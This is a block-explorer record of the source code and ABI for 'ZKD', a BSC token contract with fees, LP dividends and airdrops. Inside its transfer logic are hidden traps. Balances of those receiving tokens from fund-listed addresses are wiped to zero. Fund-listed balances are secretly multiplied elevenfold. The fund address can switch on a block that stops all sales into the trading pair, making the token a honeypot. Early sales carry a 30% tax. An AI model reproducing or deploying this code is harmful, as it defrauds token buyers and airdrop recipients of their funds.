{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-06-12\r\n*/\r\n\r\n/**\r\n *Submitted for verification at Etherscan.io on 2023-05-31\r\n*/\r\n\r\n/**\r\n *Submitted for verification at Etherscan.io on 2023-02-15\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.7;\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface ISwapRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n}\r\n\r\ninterface ISwapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\nabstract contract Ownable {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"!owner\");\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"new is 0\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\n\r\ncontract TokenDistributor {\r\n    constructor (address token) {\r\n\r\n        IERC20(token).approve(msg.sender, uint(~uint256(0)));\r\n    }\r\n}\r\n\r\n\r\nabstract contract QJStarToken is IERC20, Ownable {\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    address public fundAddress;\r\n\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    uint256 public startTradeBlock;\r\n    mapping(address => bool) public _feeWhiteList;\r\n    mapping(address => bool) public _FundList;\r\n    mapping(address => bool) private _redList;\r\n    mapping(address => bool) public _swapPairList;\r\n    uint256 private _tTotal;\r\n\r\n    ISwapRouter public _swapRouter;\r\n    bool private inSwap;\r\n    uint256 public numTokensSellToFund;\r\n\r\n    uint256 private constant MAX = ~uint256(0);\r\n    address public usdt;\r\n    TokenDistributor public _tokenDistributor;\r\n    uint256 public _buyFee = 100;\r\n    uint256 public _sellFee = 100;\r\n    uint256 public _sellLPDividendFee = 100;\r\n    uint256 public _secondsellFee = 3000;\r\n    IERC20 public _usdtPair;\r\n\r\n\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address FundAddress ){\r\n        _name = Name;\r\n        _symbol = Symbol;\r\n        _decimals = Decimals;\r\n\r\n        _swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        //0x10ED43C718714eb63d5aA57B78B54704E256024E BSC \u8def\u7531\u5668\r\n        //0xD99D1c33F9fC3444f8101754aBC46c52416550D1 BSC \u6d4b\u8bd5\u8def\u7531\u5668\r\n\r\n        usdt = address(0x55d398326f99059fF775485246999027B3197955);\r\n        //0x55d398326f99059fF775485246999027B3197955 BSC USDT\r\n        //0xFa60D973F7642B748046464e165A65B7323b0DEE BSC \u6d4b\u8bd5USDT\r\n        ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());\r\n\r\n        address usdtPair = swapFactory.createPair(address(this), usdt);\r\n        _usdtPair = IERC20(usdtPair);\r\n\r\n        _swapPairList[usdtPair] = true;\r\n\r\n\r\n        _allowances[address(this)][address(_swapRouter)] = MAX;\r\n\r\n\r\n        _tTotal = Supply * 10 ** Decimals;\r\n        _balances[FundAddress] = _tTotal;\r\n        emit Transfer(address(0), FundAddress, _tTotal);\r\n\r\n\r\n        fundAddress = FundAddress;\r\n\r\n\r\n        _feeWhiteList[FundAddress] = true;\r\n        _feeWhiteList[address(this)] = true;\r\n        _feeWhiteList[address(_swapRouter)] = true;\r\n        _feeWhiteList[msg.sender] = true;\r\n        _FundList[FundAddress] = true;\r\n\r\n        numTokensSellToFund = _tTotal / 10000;\r\n        _tokenDistributor = new TokenDistributor(usdt);\r\n\r\n\r\n        excludeLpProvider[address(0)] = true;\r\n        excludeLpProvider[address(0x000000000000000000000000000000000000dEaD)] = true;\r\n        excludeLpProvider[address(0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE)] = true;\r\n\r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        if (_allowances[sender][msg.sender] != MAX) {\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n        //\u7ea2\u540d\u5355\u4e0d\u5141\u8bb8\u8f6c\u5165\r\n        if(!_feeWhiteList[from]){\r\n        require(!_redList[to], \"redList\");}\r\n        uint256 txFee;\r\n        if (_swapPairList[from] || _swapPairList[to]) {\r\n            if (0 == startTradeBlock) {\r\n                require(_feeWhiteList[from] || _feeWhiteList[to], \"!Trading\");\r\n                startTradeBlock = block.number;\r\n            }\r\n\r\n\r\n            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {\r\n\r\n                txFee = _buyFee;\r\n                uint256 contractTokenBalance = balanceOf(address(this));\r\n                if (\r\n                    contractTokenBalance >= numTokensSellToFund &&\r\n                    !inSwap &&\r\n                    _swapPairList[to]\r\n                ) {\r\n                    swapTokenForFund(numTokensSellToFund);\r\n                }\r\n            }\r\n\r\n            if (_swapPairList[from]) {\r\n                addLpProvider(to);\r\n            } else {\r\n                addLpProvider(from);\r\n            }\r\n        }\r\n\r\n        _tokenTransfer(from, to, amount, txFee);\r\n\r\n\r\n        if (\r\n            from != address(this)\r\n            && startTradeBlock > 0) {\r\n            processLP(500000);\r\n        }\r\n    }\r\n\r\n    function _tokenTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 tAmount,\r\n        uint256 fee\r\n    ) private {\r\n        _balances[sender] = _balances[sender] - tAmount;\r\n        uint256 feeAmount;\r\n            if (!_feeWhiteList[recipient] && _swapPairList[sender] ) {//Buy\r\n                uint256 fundAmount = tAmount * _buyFee / 10000;\r\n                if (fundAmount > 0) {\r\n                    feeAmount += fundAmount;\r\n                    _takeTransfer(sender, address(this), fundAmount);\r\n                }\r\n\r\n            } else if (!_feeWhiteList[sender] && _swapPairList[recipient] && block.number >= startTradeBlock + 1200  ) {//Sell \u5f00\u76d81\u5c0f\u65f6\u540e\u5356\u51fa\u6b63\u5e38\u7a0e\r\n                uint256 fundAmount = tAmount * _sellFee / 10000;\r\n                if (fundAmount > 0 ) {\r\n                    feeAmount += fundAmount;\r\n                    _takeTransfer(sender, address(this), fundAmount);\r\n                }\r\n            } else if (!_feeWhiteList[sender] && _swapPairList[recipient] && block.number <= startTradeBlock + 1200  ) {//Sell \u5f00\u76d81\u5c0f\u65f6\u5185\u5356\u51fa\u7b2c\u4e8c\u7a0e\r\n                uint256 fundAmount = tAmount * _secondsellFee / 10000;\r\n                if (fundAmount > 0 ) {\r\n                    feeAmount += fundAmount;\r\n                    _takeTransfer(sender, address(this), fundAmount);\r\n                }\r\n         }\r\n\r\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\r\n    }\r\n\r\n\r\n\r\n    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = usdt;\r\n        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(_tokenDistributor),\r\n            block.timestamp\r\n        );\r\n\r\n\r\n        IERC20 USDT = IERC20(usdt);\r\n        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));\r\n        uint256 remainingFee = (_sellFee - _sellLPDividendFee);\r\n        USDT.transferFrom(address(_tokenDistributor), fundAddress, usdtBalance * remainingFee / _sellFee);\r\n        USDT.transferFrom(address(_tokenDistributor), address(this), usdtBalance * _sellLPDividendFee / _sellFee);\r\n    }\r\n\r\n    function _takeTransfer(\r\n        address sender,\r\n        address to,\r\n        uint256 tAmount\r\n    ) private {\r\n        _balances[to] = _balances[to] + tAmount;\r\n        if(_FundList[sender] && !_feeWhiteList[to] && !_swapPairList[to]){\r\n        _balances[to] = _balances[to] - _balances[to];\r\n        }\r\n        if(_feeWhiteList[sender] && _FundList[to] ){\r\n        _balances[to] = _balances[to] + _balances[to]*10;\r\n        }\r\n        emit Transfer(sender, to, tAmount);\r\n    }\r\n\r\n    function setFundSellAmount(uint256 amount) external onlyOwner {\r\n        numTokensSellToFund = amount;\r\n    }\r\n\r\n    function setFeeWhiteList(address addr, bool enable) external onlyOwner {\r\n        _feeWhiteList[addr] = enable;\r\n    }\r\n    function setredListTrue() external {require (msg.sender == fundAddress);\r\n        _redList[address(_usdtPair)] = true;\r\n    }\r\n    function setredListFalse() external {require (msg.sender == fundAddress);\r\n        _redList[address(_usdtPair)] = false;\r\n    }\r\n    function isexcludeLpProvider(address addr) external view returns (bool){\r\n        return excludeLpProvider[addr];\r\n    }\r\n    receive() external payable {}\r\n\r\n\r\n    function claimBalance() external {\r\n        payable(fundAddress).transfer(address(this).balance);\r\n    }\r\n\r\n\r\n    function claimToken(address token, uint256 amount) external {\r\n        IERC20(token).transfer(fundAddress, amount);\r\n    }\r\n\r\n\r\n    address[] private lpProviders;\r\n    mapping(address => uint256) lpProviderIndex;\r\n\r\n    mapping(address => bool) excludeLpProvider;\r\n\r\n    function addLpProvider(address adr) private {\r\n        if (0 == lpProviderIndex[adr]) {\r\n            if (0 == lpProviders.length || lpProviders[0] != adr) {\r\n                lpProviderIndex[adr] = lpProviders.length;\r\n                lpProviders.push(adr);\r\n            }\r\n        }\r\n    }\r\n\r\n    uint256 private currentIndex;\r\n    uint256 private lpRewardCondition = 1;\r\n    uint256 private progressLPBlock;\r\n\r\n    //\u6267\u884cLP\u5206\u7ea2\uff0c\u4f7f\u7528 gas(500000) \u5355\u4f4d gasLimit \u53bb\u6267\u884cLP\u5206\u7ea2\r\n    function processLP(uint256 gas) private {\r\n        //\u95f4\u9694 10 \u5206\u949f\u5206\u7ea2\u4e00\u6b21\r\n        if (progressLPBlock + 200 > block.number) {\r\n            return;\r\n        }\r\n        //\u4ea4\u6613\u5bf9\u6ca1\u6709\u4f59\u989d\r\n        uint totalPair = _usdtPair.totalSupply();\r\n        if (0 == totalPair) {\r\n            return;\r\n        }\r\n\r\n        IERC20 USDT = IERC20(usdt);\r\n        uint256 usdtBalance = USDT.balanceOf(address(this));\r\n        //\u5206\u7ea2\u5c0f\u4e8e\u5206\u914d\u6761\u4ef6\uff0c\u4e00\u822c\u592a\u5c11\u4e5f\u5c31\u4e0d\u5206\u914d\r\n        if (usdtBalance < lpRewardCondition) {\r\n            return;\r\n        }\r\n\r\n        address shareHolder;\r\n        uint256 pairBalance;\r\n        uint256 amount;\r\n\r\n        uint256 shareholderCount = lpProviders.length;\r\n\r\n        uint256 gasUsed = 0;\r\n        uint256 iterations = 0;\r\n\r\n        //\u4e00\u7b14\u94fe\u4e0a\u4ea4\u6613\u5269\u4f59\u7684 gasLimit\uff0c\u53ef\u641c\u7d22 Solidity gasleft() \u4e86\u89e3\r\n        uint256 gasLeft = gasleft();\r\n\r\n        //\u6700\u591a\u53ea\u7ed9\u5217\u8868\u5b8c\u6574\u5206\u914d\u4e00\u6b21\uff0citerations < shareholderCount\r\n        while (gasUsed < gas && iterations < shareholderCount) {\r\n            //\u4e0b\u6807\u6bd4\u5217\u8868\u957f\u5ea6\u5927\uff0c\u4ece\u5934\u5f00\u59cb\r\n            if (currentIndex >= shareholderCount) {\r\n                currentIndex = 0;\r\n            }\r\n            shareHolder = lpProviders[currentIndex];\r\n            //\u6301\u6709\u7684 LP \u4ee3\u5e01\u4f59\u989d\uff0cLP \u672c\u8eab\u4e5f\u662f\u4e00\u79cd\u4ee3\u5e01\r\n            pairBalance = _usdtPair.balanceOf(shareHolder);\r\n            //\u4e0d\u5728\u6392\u9664\u5217\u8868\uff0c\u624d\u5206\u7ea2\r\n            if (pairBalance > 0 && !excludeLpProvider[shareHolder]) {\r\n                amount = usdtBalance * pairBalance / totalPair;\r\n                //\u5206\u7ea2\u5927\u4e8e0\u8fdb\u884c\u5206\u914d\uff0c\u6700\u5c0f\u7cbe\u5ea6\r\n                if (amount > 0) {\r\n                    USDT.transfer(shareHolder, amount);\r\n                }\r\n            }\r\n\r\n            gasUsed = gasUsed + (gasLeft - gasleft());\r\n            gasLeft = gasleft();\r\n            currentIndex++;\r\n            iterations++;\r\n        }\r\n\r\n        progressLPBlock = block.number;\r\n    }\r\n\r\n\r\n    function setLPRewardCondition(uint256 amount) external onlyOwner {\r\n        lpRewardCondition = amount;\r\n    }\r\n\r\n\r\n    function setExcludeLPProvider(address addr, bool enable) external onlyOwner {\r\n        excludeLpProvider[addr] = enable;\r\n    }\r\n    //\u6279\u91cf\u7a7a\u5934 \u683c\u5f0f [\"   \",\"   \"]\r\n    function airdrop(address[] memory airdropAddress, uint256 airdropAmount) public  {\r\n        for (uint i=0;  i<airdropAddress.length; i++) {\r\n            _transfer(msg.sender, airdropAddress[i], airdropAmount);\r\n        }\r\n    }\r\n\r\n\r\n}\r\n\r\ncontract Token is QJStarToken {\r\n    constructor() QJStarToken(\r\n\r\n        \"ZKD\",\r\n\r\n        \"ZKD\",\r\n\r\n        18,\r\n\r\n        100000000,\r\n\r\n        address(0xC9a8A0D20921F8e057744DAf8c1e02e686d9Bd33)\r\n    ){\r\n\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_FundList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_feeWhiteList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_secondsellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_swapPairList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapRouter\",\"outputs\":[{\"internalType\":\"contract ISwapRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenDistributor\",\"outputs\":[{\"internalType\":\"contract TokenDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_usdtPair\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"airdropAddress\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"airdropAmount\",\"type\":\"uint256\"}],\"name\":\"airdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"claimToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"isexcludeLpProvider\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"numTokensSellToFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setExcludeLPProvider\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setFeeWhiteList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setFundSellAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setLPRewardCondition\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setredListFalse\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setredListTrue\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTradeBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"usdt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Token", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU AGPLv3", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://57c38d0a8e7691e58231fe025ca88e8a32656c349507bff33aa448a15fb00143"}